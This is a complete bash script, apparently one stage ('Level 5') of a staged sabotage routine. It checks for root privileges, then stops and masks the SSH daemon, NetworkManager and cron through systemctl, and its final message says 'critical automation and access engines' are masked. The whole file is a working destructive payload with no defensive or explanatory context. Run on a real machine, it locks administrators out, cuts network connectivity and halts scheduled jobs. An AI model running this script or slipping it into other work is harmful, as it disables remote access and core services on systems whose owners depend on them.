#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  echo "Error: High-privilege access required. Execute with sudo." >&2
  exit 1
fi

systemctl mask --now sshd 2>/dev/null
systemctl mask --now NetworkManager 2>/dev/null
systemctl mask --now crond 2>/dev/null
systemctl daemon-reload

echo "[+] Level 5 complete. Critical automation and access engines masked."